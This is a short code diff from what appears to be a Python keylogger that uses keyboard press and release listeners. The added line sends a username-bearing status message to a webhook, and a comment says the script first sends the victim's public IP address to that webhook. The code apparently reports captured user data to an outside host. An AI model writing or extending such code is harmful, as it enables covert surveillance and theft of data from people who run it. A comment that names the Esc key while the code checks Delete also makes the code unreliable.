@@ -79,6 +79,7 @@ def on_press(key):
 def on_release(key):
     if key == keyboard.Key.delete:
         # Stop the listener when the Esc key is pressed
+        send_to_webhook(f"Connection stopped by user: {username}")
         return False
 
 # Start by sending the public IP address to the webhook
